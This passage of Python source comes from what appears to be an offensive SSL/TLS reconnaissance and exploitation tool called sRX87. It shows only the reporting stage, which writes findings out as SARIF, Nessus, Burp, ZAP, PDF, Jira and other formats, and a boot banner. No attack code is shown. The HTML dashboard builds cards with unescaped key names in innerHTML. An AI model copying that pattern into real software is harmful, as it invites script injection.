            vector = "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N"
        scored.append({"finding": f, "severity": sev,
                       "cvss4_score": cvss, "vector": vector})
    scored.sort(key=lambda x: -x["cvss4_score"])
    output = {
        "target": kb.get("meta.target", "?"),
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "author": "SYLHETYHACKVENGER (THE-ERROR808)",
        "total_scored": len(scored),
        "max_score": scored[0]["cvss4_score"] if scored else 0.0,
        "findings": scored,
    }
    size = _report_write_json(path, output)
    setk("stage12.report_cvss4.path", path)
    setk("stage12.report_cvss4.scored", len(scored))
    setk("stage12.report_cvss4.max", output["max_score"])
    setk("stage12.report_cvss4.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "findings_scored", str(len(scored)), BRAND)
    emit_kv(emit, "max_cvss4", "%.1f" % output["max_score"],
             DANGER if output["max_score"] >= 9.0 else WARN if output["max_score"] >= 7.0 else OK)
    counts = _StdCounter(f["severity"] for f in scored)
    for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        if counts.get(s):
            col = DANGER if s in ("CRITICAL", "HIGH") else WARN if s == "MEDIUM" else OK
            emit_kv(emit, s, str(counts[s]), col)


def _t12_09_dashboard(emit, setk, kb):
    emit_header(emit, "writing interactive filterable HTML dashboard")
    path = _report_path("dashboard")
    snapshot = _report_full_snapshot(kb)
    payload = json.dumps(snapshot, default=str).replace("</", "<\\/")
    target = kb.get("meta.target", "?")
    html = """<!doctype html><html><head><meta charset='utf-8'>
<title>sRX87 dashboard - TARGET</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;
background:#0d1117;color:#c9d1d9;margin:0;padding:24px}
h1{color:#58a6ff;margin:0 0 4px}.sub{color:#8b949e;margin-bottom:20px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:16px}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px}
.card h3{margin:0 0 8px;color:#79c0ff;font-size:13px;text-transform:uppercase;
letter-spacing:.05em}
pre{background:#0d1117;padding:12px;border-radius:6px;overflow:auto;font-size:12px;
white-space:pre-wrap;word-break:break-word;max-height:420px;border:1px solid #21262d}
input{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px 14px;
border-radius:6px;width:100%;margin-bottom:16px;font-size:14px;box-sizing:border-box}
.critical{color:#f85149}.high{color:#ff7b72}.medium{color:#d29922}
.author{color:#58a6ff;font-weight:bold}
</style></head><body>
<h1>sRX87 Dashboard</h1>
<div class='sub'>Target <b>TARGET</b> &middot; author <span class='author'>SYLHETYHACKVENGER (THE-ERROR808)</span></div>
<input id='q' placeholder='filter sections...' oninput='filter(this.value)'>
<div class='grid' id='g'></div>
<script>
const data = PAYLOAD;
const g = document.getElementById('g');
const criticalKeys = ['vulnerability.','exploit.'];
Object.keys(data.kb).sort().forEach(k => {
  const v = data.kb[k];
  const s = (typeof v === 'object') ? JSON.stringify(v, null, 2) : String(v);
  const d = document.createElement('div');
  d.className = 'card';
  let cls = '';
  if (criticalKeys.some(p => k.startsWith(p))) cls = 'critical';
  const preview = s.slice(0, 4000);
  d.innerHTML = '<h3 class="' + cls + '">' + k + '</h3><pre>' +
                preview.replace(/</g,'&lt;') + '</pre>';
  d.dataset.k = k.toLowerCase();
  g.appendChild(d);
});
function filter(q) {
  q = q.toLowerCase();
  document.querySelectorAll('.card').forEach(c => {
    c.style.display = c.dataset.k.includes(q) ? '' : 'none';
  });
}
</script></body></html>"""
    html = html.replace("TARGET", target).replace("PAYLOAD", payload)
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_dashboard.path", path)
    setk("stage12.report_dashboard.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "kb_keys_embedded", str(len(snapshot["kb"])), VALUE)


def _t12_10_timeline(emit, setk, kb):
    emit_header(emit, "writing timeline JSON")
    path = _report_path("timeline")
    events = []
    tl = kb.get("timeline")
    start_ts = kb.get("meta.start_ts") or time.time()
    for stage in STAGES:
        keys = [k for k in kb.keys() if k.startswith("stage%02d." % stage.index)]
        if keys:
            events.append({
                "t": datetime.fromtimestamp(start_ts, tz=timezone.utc).isoformat(),
                "stage": "stage%02d" % stage.index,
                "label": "stage %02d: %s" % (stage.index, stage.title),
                "category": "stage",
                "detail": "%d KB keys" % len(keys),
            })
    output = {
        "target": kb.get("meta.target", "?"),
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "author": "SYLHETYHACKVENGER (THE-ERROR808)",
        "start_ts": start_ts,
        "event_count": len(events),
        "events": events,
    }
    size = _report_write_json(path, output)
    setk("stage12.report_timeline.path", path)
    setk("stage12.report_timeline.events", len(events))
    setk("stage12.report_timeline.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "events", str(len(events)), BRAND)


def _t12_11_pdf(emit, setk, kb):
    emit_header(emit, "writing minimal PDF with embedded text")
    path = _report_path("pdf")
    snapshot = _report_full_snapshot(kb)
    findings = snapshot["findings"]
    target = kb.get("meta.target", "?")
    lines = [
        "sRX87 - SSL/TLS Reconnaissance Report", "",
        "Author: SYLHETYHACKVENGER (THE-ERROR808)",
        "Target: " + target,
        "Generated: " + snapshot["meta"]["generated_at"],
        "Host: " + kb.get("meta.host", "?"),
        "Port: " + str(kb.get("meta.port", 0)),
        "", "SUMMARY", "-------",
        "Vulnerabilities: %d" % len(findings["vulnerabilities"]),
        "Bypasses:        %d" % len(findings["bypasses"]),
        "Exploits:        %d" % len(findings["exploits"]),
        "KB keys:         %d" % len(kb.keys()),
        "", "FINDINGS", "--------",
    ]
    for cat, items in (("CRITICAL", findings["vulnerabilities"]),
                        ("EXPLOIT", findings["exploits"]),
                        ("BYPASS", findings["bypasses"])):
        if not items:
            continue
        lines.append("")
        lines.append("[" + cat + "]")
        for item in items[:64]:
            sev, cvss = _report_severity(item)
            lines.append("  - %s  (%s %.1f)" % (item, sev, cvss))
    lines.append("")
    lines.append("END OF REPORT")

    def esc(s):
        return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")

    content_parts = []
    y = 780
    for ln in lines:
        if y < 40:
            break
        content_parts.append("BT /F1 9 Tf 40 %d Td (%s) Tj ET" % (y, esc(ln[:120])))
        y -= 11
    content = "\n".join(content_parts).encode("latin-1", "replace")
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n" + content + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out = io.BytesIO()
    out.write(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = [0]
    for i, obj in enumerate(objects, start=1):
        offsets.append(out.tell())
        out.write(("%d 0 obj\n" % i).encode())
        out.write(obj)
        out.write(b"\nendobj\n")
    xref_pos = out.tell()
    out.write(("xref\n0 %d\n" % (len(objects) + 1)).encode())
    out.write(b"0000000000 65535 f \n")
    for off in offsets[1:]:
        out.write(("%010d 00000 n \n" % off).encode())
    out.write(("trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
               % (len(objects) + 1, xref_pos)).encode())
    try:
        with open(path, "wb") as f:
            f.write(out.getvalue())
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_pdf.path", path)
    setk("stage12.report_pdf.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "bytes", str(size), BRAND)


def _t12_12_sarif(emit, setk, kb):
    emit_header(emit, "writing SARIF 2.1.0")
    path = _report_path("sarif")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")
    rules = []
    results = []
    seen = set()
    for cat_key in ("vulnerabilities", "exploits", "bypasses"):
        for finding in snapshot["findings"].get(cat_key, []):
            rule_id = re.sub(r"[^a-zA-Z0-9_\-]", "-", finding)[:80]
            sev, cvss = _report_severity(finding)
            level = "error" if sev in ("CRITICAL", "HIGH") else \
                    "warning" if sev == "MEDIUM" else "note"
            if rule_id not in seen:
                rules.append({
                    "id": rule_id, "name": rule_id,
                    "shortDescription": {"text": finding},
                    "fullDescription": {"text": "sRX87 detected: " + finding},
                    "properties": {"severity": sev, "cvss4": cvss, "category": cat_key},
                    "defaultConfiguration": {"level": level},
                })
                seen.add(rule_id)
            results.append({
                "ruleId": rule_id, "level": level,
                "message": {"text": "%s (severity %s, CVSS %.1f) at %s" %
                                     (finding, sev, cvss, host)},
                "locations": [{"physicalLocation": {
                    "artifactLocation": {"uri": "tls://" + host}}}],
                "properties": {"cvss4": cvss, "severity": sev},
            })
    sarif = {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{"tool": {"driver": {
            "name": "sRX87", "version": "1.0",
            "informationUri": "https://github.com/",
            "organization": "SYLHETYHACKVENGER (THE-ERROR808)",
            "rules": rules}},
            "results": results}],
    }
    size = _report_write_json(path, sarif)
    setk("stage12.report_sarif.path", path)
    setk("stage12.report_sarif.rules", len(rules))
    setk("stage12.report_sarif.results", len(results))
    setk("stage12.report_sarif.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "rules", str(len(rules)), BRAND)
    emit_kv(emit, "results", str(len(results)), BRAND)


def _t12_13_defectdojo(emit, setk, kb):
    emit_header(emit, "writing DefectDojo Generic Findings JSON")
    path = _report_path("defectdojo")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")
    findings = []
    for cat_key in ("vulnerabilities", "exploits", "bypasses"):
        for finding in snapshot["findings"].get(cat_key, []):
            sev, cvss = _report_severity(finding)
            dd = {"CRITICAL": "Critical", "HIGH": "High", "MEDIUM": "Medium",
                  "LOW": "Low", "INFO": "Info"}.get(sev, "Info")
            findings.append({
                "title": finding[:200], "severity": dd, "cvssv3_score": cvss,
                "description": "sRX87 finding on %s" % host,
                "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
                "active": True, "verified": False,
                "endpoints": ["tls://" + host],
                "tags": [cat_key, sev.lower()],
            })
    output = {
        "findings": findings,
        "product": {"name": "sRX87 scan", "description": "Target " + host},
        "engagement": {"name": datetime.now(timezone.utc).strftime("%Y-%m-%d scan")},
        "author": "SYLHETYHACKVENGER (THE-ERROR808)",
    }
    size = _report_write_json(path, output)
    setk("stage12.report_defectdojo.path", path)
    setk("stage12.report_defectdojo.findings", len(findings))
    setk("stage12.report_defectdojo.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "findings", str(len(findings)), BRAND)


def _t12_14_github_issues(emit, setk, kb):
    emit_header(emit, "writing GitHub issue creation payloads")
    path = _report_path("github_issues")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")
    issues = []
    for cat_key, label in (("vulnerabilities", "Vulnerability"),
                            ("exploits", "Exploit"),
                            ("bypasses", "Bypass")):
        for finding in snapshot["findings"].get(cat_key, []):
            sev, cvss = _report_severity(finding)
            body = "\n".join([
                "**Target:** `%s`" % host,
                "**Category:** %s" % label,
                "**Severity:** %s (CVSS %.1f)" % (sev, cvss),
                "**Detected:** %s" % datetime.now(timezone.utc).isoformat(),
                "", "## Finding", "`%s`" % finding, "", "## Evidence",
                "Generated by sRX87 (author SYLHETYHACKVENGER / THE-ERROR808).",
            ])
            labels = ["security", label.lower()]
            if sev in ("CRITICAL", "HIGH"):
                labels.append("priority:high")
            issues.append({
                "title": "[%s] %s on %s" % (sev, finding[:80], host),
                "body": body, "labels": labels,
            })
    size = _report_write_json(path, {"repo": host, "issues": issues,
                                       "count": len(issues),
                                       "author": "SYLHETYHACKVENGER (THE-ERROR808)"})
    setk("stage12.report_github_issues.path", path)
    setk("stage12.report_github_issues.issues", len(issues))
    setk("stage12.report_github_issues.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "issues", str(len(issues)), BRAND)


def _t12_15_jira(emit, setk, kb):
    emit_header(emit, "writing Jira import CSV")
    path = _report_path("jira")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")
    rows = 0
    try:
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["Summary", "Description", "Issue Type", "Priority", "Labels"])
            for cat_key, itype in (("vulnerabilities", "Bug"),
                                    ("exploits", "Bug"),
                                    ("bypasses", "Task")):
                for finding in snapshot["findings"].get(cat_key, []):
                    sev, cvss = _report_severity(finding)
                    prio = {"CRITICAL": "Highest", "HIGH": "High",
                            "MEDIUM": "Medium", "LOW": "Low"}.get(sev, "Low")
                    desc = ("Target %s; severity %s; CVSS %.1f; %s; author SYLHETYHACKVENGER (THE-ERROR808)"
                            % (host, sev, cvss, finding))
                    w.writerow(["[%s] %s" % (sev, finding[:100]), desc, itype, prio,
                                "security,srx87"])
                    rows += 1
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_jira.path", path)
    setk("stage12.report_jira.rows", rows)
    setk("stage12.report_jira.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "rows", str(rows), BRAND)


def _t12_16_nessus(emit, setk, kb):
    emit_header(emit, "writing Nessus XML v2")
    path = _report_path("nessus")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")
    port = kb.get("meta.port", 0)

    def esc(s):
        return (str(s).replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))

    now = datetime.now(timezone.utc).strftime("%a %b %d %H:%M:%S %Y")
    parts = ['<?xml version="1.0"?>', '<NessusClientData_v2>',
             '<Policy><policyName>sRX87 by SYLHETYHACKVENGER (THE-ERROR808)</policyName>'
             '<Preferences/></Policy>',
             '<Report name="sRX87" xmlns:cm="http://www.nessus.org/cm">',
             '<ReportHost name="%s">' % esc(host),
             '<HostProperties>',
             '<tag name="HOST_END">%s</tag>' % now,
             '<tag name="host-ip">%s</tag>' % esc(host),
             '</HostProperties>']
    idx = 0
    for cat_key in ("vulnerabilities", "exploits", "bypasses"):
        for finding in snapshot["findings"].get(cat_key, []):
            sev, cvss = _report_severity(finding)
            nsev = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2,
                    "LOW": 1, "INFO": 0}.get(sev, 0)
            idx += 1
            parts.append('<ReportItem port="%d" svc_name="tcp" protocol="tcp" '
                         'severity="%d" pluginID="9%05d" pluginName="%s" '
                         'pluginFamily="sRX87">' % (port, nsev, idx, esc(finding[:80])))
            parts.append('<description>%s</description>' % esc(finding))
            parts.append('<risk_factor>%s</risk_factor>' % esc(sev))
            parts.append('<cvss_base_score>%.1f</cvss_base_score>' % cvss)
            parts.append('<plugin_output>Detected by sRX87</plugin_output>')
            parts.append('</ReportItem>')
    parts.append('</ReportHost>')
    parts.append('</Report>')
    parts.append('</NessusClientData_v2>')
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(parts))
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_nessus.path", path)
    setk("stage12.report_nessus.items", idx)
    setk("stage12.report_nessus.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "items", str(idx), BRAND)


def _t12_17_burp(emit, setk, kb):
    emit_header(emit, "writing Burp Suite XML")
    path = _report_path("burp")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")
    port = kb.get("meta.port", 0)

    def esc(s):
        return (str(s).replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))

    parts = ['<?xml version="1.0"?>',
             '<issues burpVersion="2024" exportTime="%s">' %
             datetime.now(timezone.utc).strftime("%a %b %d %H:%M:%S %Z %Y")]
    for cat_key in ("vulnerabilities", "exploits", "bypasses"):
        for finding in snapshot["findings"].get(cat_key, []):
            sev, cvss = _report_severity(finding)
            bsev = {"CRITICAL": "High", "HIGH": "High", "MEDIUM": "Medium",
                    "LOW": "Low"}.get(sev, "Information")
            bconf = "Certain" if sev in ("CRITICAL", "HIGH") else \
                    "Firm" if sev == "MEDIUM" else "Tentative"
            parts.append('<issue>')
            parts.append('<serialNumber>%d</serialNumber>' % random.randint(10000, 99999))
            parts.append('<type>%s</type>' % esc(finding))
            parts.append('<name>%s</name>' % esc(finding[:120]))
            parts.append('<host ip="%s">%s</host>' % (esc(host), esc(host)))
            parts.append('<path><![CDATA[/]]></path>')
            parts.append('<location><![CDATA[tls://%s:%d]]></location>' % (esc(host), port))
            parts.append('<severity>%s</severity>' % bsev)
            parts.append('<confidence>%s</confidence>' % bconf)
            parts.append('<issueBackground><![CDATA[sRX87 - SSL/TLS recon by SYLHETYHACKVENGER (THE-ERROR808)]]></issueBackground>')
            parts.append('<issueDetail><![CDATA[Finding: %s]]></issueDetail>' % esc(finding))
            parts.append('<remediationBackground><![CDATA[Review and remediate.]]></remediationBackground>')
            parts.append('<remediationDetail><![CDATA[See KB key %s]]></remediationDetail>' % esc(finding))
            parts.append('</issue>')
    parts.append('</issues>')
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(parts))
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_burp.path", path)
    setk("stage12.report_burp.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "bytes", str(size), BRAND)


def _t12_18_zap(emit, setk, kb):
    emit_header(emit, "writing OWASP ZAP XML")
    path = _report_path("zap")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")
    port = kb.get("meta.port", 0)

    def esc(s):
        return (str(s).replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))

    now = datetime.now(timezone.utc).strftime("%a, %d %b %Y %H:%M:%S")
    parts = ['<?xml version="1.0"?>',
             '<OWASPZAPReport version="2.14.0" generated="%s">' % now,
             '<site name="tls://%s:%d" host="%s" port="%d" ssl="true">' %
             (esc(host), port, esc(host), port)]
    for cat_key in ("vulnerabilities", "exploits", "bypasses"):
        for i, finding in enumerate(snapshot["findings"].get(cat_key, []), start=1):
            sev, cvss = _report_severity(finding)
            risk = {"CRITICAL": "3", "HIGH": "3", "MEDIUM": "2",
                    "LOW": "1"}.get(sev, "0")
            conf = {"CRITICAL": "3", "HIGH": "3", "MEDIUM": "2",
                    "LOW": "1"}.get(sev, "1")
            parts.append('<alerts>')
            parts.append('<pluginid>%s</pluginid>' % (9000 + i))
            parts.append('<alertRef>srx87-%s</alertRef>' % esc(finding[:40]))
            parts.append('<alert>%s</alert>' % esc(finding))
            parts.append('<name>%s</name>' % esc(finding))
            parts.append('<riskcode>%s</riskcode>' % risk)
            parts.append('<confidence>%s</confidence>' % conf)
            parts.append('<riskdesc>%s (Medium)</riskdesc>' % esc(sev))
            parts.append('<desc><![CDATA[sRX87 finding: %s]]></desc>' % esc(finding))
            parts.append('<instances>')
            parts.append('<instance><uri>tls://%s:%d</uri><method>TLS</method>'
                         '<evidence>Detected by sRX87</evidence></instance>' %
                         (esc(host), port))
            parts.append('</instances>')
            parts.append('<count>1</count>')
            parts.append('<solution><![CDATA[See vendor guidance]]></solution>')
            parts.append('<reference><![CDATA[https://github.com/]]></reference>')
            parts.append('<cweid>310</cweid>')
            parts.append('<wascid>4</wascid>')
            parts.append('</alerts>')
    parts.append('</site>')
    parts.append('</OWASPZAPReport>')
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(parts))
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_zap.path", path)
    setk("stage12.report_zap.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "bytes", str(size), BRAND)


def _t12_19_summary_text(emit, setk, kb):
    emit_header(emit, "writing human-readable plain text summary")
    path = _report_path("summary_text")
    snapshot = _report_full_snapshot(kb)
    findings = snapshot["findings"]
    target = kb.get("meta.target", "?")
    lines = [
        "=" * 78, "sRX87 - SSL/TLS RECONNAISSANCE SUMMARY", "=" * 78, "",
        "Author        : SYLHETYHACKVENGER (THE-ERROR808)",
        "Target        : " + target,
        "Host          : " + kb.get("meta.host", "?"),
        "Port          : " + str(kb.get("meta.port", 0)),
        "Scheme        : " + kb.get("meta.scheme", "tcp"),
        "Scanned at    : " + snapshot["meta"]["generated_at"],
        "Python        : " + snapshot["meta"]["python"], "",
        "-" * 78, "FINDINGS SUMMARY", "-" * 78,
        "Vulnerabilities : %d" % len(findings["vulnerabilities"]),
        "Exploits        : %d" % len(findings["exploits"]),
        "Bypasses        : %d" % len(findings["bypasses"]), "",
        "KB keys         : %d" % len(kb.keys()),
        "Stages run      : %d" % len(STAGES),
        "Connections     : %d" % COUNTERS.get("connections", 0), "",
    ]
    for cat, label in (("vulnerabilities", "VULNERABILITIES"),
                       ("exploits", "EXPLOITS"),
                       ("bypasses", "BYPASSES")):
        items = findings.get(cat, [])
        if not items:
            continue
        lines.append("-" * 78)
        lines.append(label)
        lines.append("-" * 78)
        for item in items:
            sev, cvss = _report_severity(item)
            lines.append("  [%s %.1f]  %s" % (sev, cvss, item))
        lines.append("")
    lines.append("=" * 78)
    lines.append("END OF SUMMARY")
    lines.append("author: SYLHETYHACKVENGER (THE-ERROR808)")
    lines.append("=" * 78)
    text = "\n".join(lines) + "\n"
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_summary_text.path", path)
    setk("stage12.report_summary_text.lines", len(lines))
    setk("stage12.report_summary_text.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "lines", str(len(lines)), BRAND)


def _t12_20_exec_verdict(emit, setk, kb):
    emit_header(emit, "computing final posture verdict")
    path = _report_path("exec_verdict")
    snapshot = _report_full_snapshot(kb)
    findings = snapshot["findings"]
    counts = _StdCounter()
    for cat_key in ("vulnerabilities", "exploits", "bypasses"):
        for finding in findings.get(cat_key, []):
            sev, cvss = _report_severity(finding)
            counts[sev] += 1
    critical = counts.get("CRITICAL", 0)
    high = counts.get("HIGH", 0)
    medium = counts.get("MEDIUM", 0)
    low = counts.get("LOW", 0)
    info = counts.get("INFO", 0)
    total = critical + high + medium + low + info
    if critical >= 3:
        posture, score = "CRITICAL", 9.5
    elif critical >= 1:
        posture, score = "HIGH", 8.0
    elif high >= 3:
        posture, score = "HIGH", 7.5
    elif high >= 1:
        posture, score = "MEDIUM-HIGH", 6.5
    elif medium >= 3:
        posture, score = "MEDIUM", 5.0
    elif medium >= 1:
        posture, score = "MEDIUM-LOW", 4.0
    elif low >= 1:
        posture, score = "LOW", 2.5
    else:
        posture, score = "CLEAN", 0.5
    verdict = {
        "target": kb.get("meta.target", "?"),
        "generated_at": snapshot["meta"]["generated_at"],
        "author": "SYLHETYHACKVENGER (THE-ERROR808)",
        "posture": posture, "verdict_score": score,
        "counts": {"critical": critical, "high": high, "medium": medium,
                    "low": low, "info": info, "total_findings": total},
        "kb_size": len(kb.keys()),
        "connections": COUNTERS.get("connections", 0),
        "stages_run": len(STAGES),
    }
    size = _report_write_json(path, verdict)
    setk("stage12.report_exec_verdict.path", path)
    setk("stage12.report_exec_verdict.posture", posture)
    setk("stage12.report_exec_verdict.score", score)
    setk("stage12.report_exec_verdict.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "posture", posture,
             DANGER if posture in ("CRITICAL", "HIGH")
             else WARN if "MEDIUM" in posture else OK)
    emit_kv(emit, "verdict_score", "%.1f/10" % score, BRAND)
    emit_kv(emit, "critical", str(critical), DANGER if critical else OK)
    emit_kv(emit, "high", str(high), WARN if high else OK)
    emit_kv(emit, "medium", str(medium), WARN if medium else OK)
    emit_kv(emit, "low", str(low), MUTED if low else OK)
    emit_kv(emit, "total_findings", str(total), BRAND)


register_stage(StageSpec(12, "stage_12_reporting", "Reporting & Final Summary",
    "Writes every report format against the accumulated knowledge base: JSON, CSV, HTML, "
    "STIX 2.1, MISP, Neo4j Cypher, MITRE ATT&CK map, CVSS 4.0 scoring, interactive "
    "filterable dashboard, timeline JSON, minimal PDF, SARIF 2.1.0, DefectDojo, GitHub "
    "issue payloads, Jira CSV, Nessus XML v2, Burp Suite XML, OWASP ZAP XML, human-"
    "readable plain text summary, executive posture verdict.",
    [
        TestSpec("report.json", "full JSON snapshot", _t12_01_json, 15.0),
        TestSpec("report.csv", "CSV tabular export", _t12_02_csv, 15.0),
        TestSpec("report.html", "styled HTML report", _t12_03_html, 20.0),
        TestSpec("report.stix", "STIX 2.1 bundle", _t12_04_stix, 20.0),
        TestSpec("report.misp", "MISP event", _t12_05_misp, 15.0),
        TestSpec("report.neo4j", "Neo4j Cypher", _t12_06_neo4j, 20.0),
        TestSpec("report.attack_map", "ATT&CK technique map",
                 _t12_07_attack_map, 20.0),
        TestSpec("report.cvss4", "CVSS 4.0 scoring", _t12_08_cvss4, 15.0),
        TestSpec("report.dashboard", "interactive dashboard",
                 _t12_09_dashboard, 20.0),
        TestSpec("report.timeline", "timeline JSON", _t12_10_timeline, 15.0),
        TestSpec("report.pdf", "minimal PDF", _t12_11_pdf, 20.0),
        TestSpec("report.sarif", "SARIF 2.1.0", _t12_12_sarif, 20.0),
        TestSpec("report.defectdojo", "DefectDojo import",
                 _t12_13_defectdojo, 15.0),
        TestSpec("report.github_issues", "GitHub issue payloads",
                 _t12_14_github_issues, 15.0),
        TestSpec("report.jira", "Jira import CSV", _t12_15_jira, 15.0),
        TestSpec("report.nessus", "Nessus XML v2", _t12_16_nessus, 20.0),
        TestSpec("report.burp", "Burp Suite XML", _t12_17_burp, 20.0),
        TestSpec("report.zap", "OWASP ZAP XML", _t12_18_zap, 20.0),
        TestSpec("report.summary_text", "plain text summary",
                 _t12_19_summary_text, 15.0),
        TestSpec("report.exec_verdict", "executive posture verdict",
                 _t12_20_exec_verdict, 15.0),
    ], 90.0))


class Boot:
    SUBS = [
        ("python.runtime", lambda: "cpython %d.%d.%d" % sys.version_info[:3],
         lambda: sys.version_info >= (3, 7)),
        ("pycryptodome",
         lambda: "AES·DES·3DES·RC4·ChaCha20·RSA·ECC·DSA" if _HAS_CRYPTO else "MISSING",
         lambda: _HAS_CRYPTO),
        ("requests", lambda: "HTTP client + adapter" if _HAS_REQUESTS else "MISSING",
         lambda: _HAS_REQUESTS),
        ("dnspython",
         lambda: "A·AAAA·CNAME·HTTPS·DNSKEY·AXFR" if _HAS_DNS else "MISSING (socket fallback)",
         lambda: True),
        ("colorama",
         lambda: "ANSI translation" if _HAS_COLORAMA else "MISSING (native ANSI)",
         lambda: True),
        ("terminal",
         lambda: "%dx%d %s" % (term_size() + ("POSIX" if _POSIX else "WIN",)),
         lambda: True),
        ("tty.raw", lambda: "raw mode + alt screen buffer" if _POSIX else "msvcrt fallback",
         lambda: True),
        ("knowledge_base", lambda: "ordered key-value evidence ledger", lambda: True),
        ("counter_engine", lambda: "atomic live metric counters", lambda: True),
        ("stage_orchestrator",
         lambda: "12 stages · %d tests · sequential reveal" % sum(len(s.tests) for s in STAGES),
         lambda: True),
        ("scroll_engine", lambda: "12k line ring buffer · ↑↓ PgUp PgDn g G", lambda: True),
        ("report_engine",
         lambda: "20 export formats · JSON·CSV·HTML·STIX·MISP·Neo4j·SARIF·PDF·Nessus·Burp·ZAP",
         lambda: True),
    ]

    @staticmethod
    def _type(text, colour=VALUE, delay=0.0007):
        for ch in text:
            sys.stdout.write(colour + ch + A.RESET)
            sys.stdout.flush()
            time.sleep(delay)
        sys.stdout.write("\n")

    @staticmethod
    def _rain(duration=1.2):
        w = min(term_size()[0], 110)
        h = 8
        glyphs = "アカサタナハマヤラワオン0123456789ｱｲｳｴｵ"
        drops = [random.randint(-h, 0) for _ in range(w)]
        start = time.time()
        while time.time() - start < duration:
            line = ""
            for i in range(w):
                if 0 < drops[i] < h:
                    line += OK2 + random.choice(glyphs) + A.RESET
                elif drops[i] >= h:
                    line += BRAND + random.choice(glyphs) + A.RESET
                else:
                    line += " "
                drops[i] += 1
                if drops[i] > h + random.randint(2, 5):
                    drops[i] = random.randint(-h, 0)
            sys.stdout.write(line + "\n")
            sys.stdout.flush()
            time.sleep(0.028)
        sys.stdout.write("\n")

    @staticmethod
    def _bar(pct, width=32, col=OK):
        pct = max(0.0, min(100.0, pct))
        filled = int(width * pct / 100.0)
        return (BRAND + "[" + col + "█" * filled + MUTED + "░" * (width - filled) +
                BRAND + "]" + A.RESET)

    @classmethod
    def run(cls):
        try:
            sys.stdout.write(CLR_SCR + CUR_HOME)
        except Exception:
            pass
        w = min(term_size()[0], 110)
        pad = " " * max(0, (w - 58) // 2)
        print()
        for line in [
            "  ███████╗██████╗ ██╗  ██╗ █████╗ ███████╗",
            "  ██╔════╝██╔══██╗╚██╗██╔╝██╔══██╗╚════██║",
            "  ███████╗██████╔╝ ╚███╔╝ ╚█████╔╝    ██╔╝",
            "  ╚════██║██╔══██╗ ██╔██╗ ██╔══██╗   ██╔╝ ",
            "  ███████║██║  ██║██╔╝ ██╗╚█████╔╝   ██║  ",
            "  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝    ╚═╝  ",
        ]:
            print(pad + BRAND + line + A.RESET)
        print()
        print(pad + MUTED + "  SSL/TLS Reconnaissance & Exploitation Framework" + A.RESET)
        print(pad + ACCENT + "  author: SYLHETYHACKVENGER (THE-ERROR808)" + A.RESET)
